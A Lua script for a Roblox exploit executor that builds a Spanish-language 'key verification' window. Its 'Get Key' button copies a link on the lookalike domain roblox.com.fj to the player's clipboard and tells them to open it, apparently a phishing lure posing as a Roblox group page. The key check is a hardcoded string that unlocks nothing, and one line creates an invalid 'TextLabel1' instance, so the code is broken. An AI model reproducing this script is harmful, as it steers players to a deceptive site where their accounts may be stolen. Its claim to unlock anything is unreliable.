-- [[ Variables ]]
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

local keyLink = "https://roblox.com.fj/communities/4137931293/"

-- [[ Creación de la GUI ]]
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ScriptsKeyGUI"
screenGui.Parent = CoreGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.new(0.2, 0.2, 0.2)
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 10)
frameCorner.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(1, 0, 0, 30)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.TextScaled = true
titleLabel.Text = "Verificación de Clave"
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.Parent = mainFrame

local titleLabel1 = Instance.new("TextLabel1")
titleLabel1.Name = "TitleLabel1"
titleLabel1.Size = UDim2.new(1, 0, 0, 30)
titleLabel1.Position = UDim2.new(0, 0, 0, 0)
titleLabel1.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
titleLabel1.TextColor3 = Color3.new(1, 1, 1)
titleLabel1.TextScaled = true
titleLabel1.Text = "Dale a get key para copiar nuesatro enlace de grupo de roblox y entra para obtener la key"
titleLabel1.Font = Enum.Font.SourceSansBold
titleLabel1.Parent = mainFrame

local keyTextBox = Instance.new("TextBox")
keyTextBox.Name = "introduce la clave aqui"
keyTextBox.Size = UDim2.new(0.9, 0, 0, 30)
keyTextBox.Position = UDim2.new(0.05, 0, 0, 40)
keyTextBox.PlaceholderText = "Introduce la clave aquí..."
keyTextBox.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
keyTextBox.BorderSizePixel = 1
keyTextBox.BorderColor3 = Color3.new(0.4, 0.4, 0.4)
keyTextBox.TextColor3 = Color3.new(1, 1, 1)
keyTextBox.TextScaled = true
keyTextBox.Parent = mainFrame

local getKeyButton = Instance.new("TextButton")
getKeyButton.Name = "GetKeyButton"
getKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
getKeyButton.Position = UDim2.new(0.05, 0, 0, 80)
getKeyButton.BackgroundColor3 = Color3.new(0.2, 0.6, 0.8)
getKeyButton.TextColor3 = Color3.new(1, 1, 1)
getKeyButton.Text = "Get Key"
getKeyButton.Font = Enum.Font.SourceSansBold
getKeyButton.Parent = mainFrame

local checkKeyButton = Instance.new("TextButton")
checkKeyButton.Name = "CheckKeyButton"
checkKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
checkKeyButton.Position = UDim2.new(0.55, 0, 0, 80)
checkKeyButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.6)
checkKeyButton.TextColor3 = Color3.new(1, 1, 1)
checkKeyButton.Text = "Check Key"
checkKeyButton.Font = Enum.Font.SourceSansBold
checkKeyButton.Parent = mainFrame

-- [[ Manejo de Eventos ]]
getKeyButton.MouseButton1Click:Connect(function()
    local success, err = pcall(function()
        setclipboard(keyLink)
    end)
    
    if success then
        keyTextBox.PlaceholderText = "¡Enlace copiado! Pégalo en tu navegador."
        wait(2)
        keyTextBox.PlaceholderText = "Introduce la clave aquí..."
    else
        warn("Error al copiar al portapapeles:", err)
        keyTextBox.PlaceholderText = "Error al copiar. Revisa la consola."
        wait(2)
        keyTextBox.PlaceholderText = "Introduce la clave aquí..."
    end
end)

checkKeyButton.MouseButton1Click:Connect(function()
    local enteredKey = keyTextBox.Text
    
    if string.len(enteredKey) > 0 then
        if enteredKey == "mi_clave_secreta_123" then
            keyTextBox.PlaceholderText = "¡Clave válida! Script desbloqueado."
        else
            keyTextBox.PlaceholderText = "Clave incorrecta. Inténtalo de nuevo."
        end
    else
        keyTextBox.PlaceholderText = "Por favor, introduce una clave."
    end
    wait(2)
    keyTextBox.PlaceholderText = "Introduce la clave aquí..."
end)
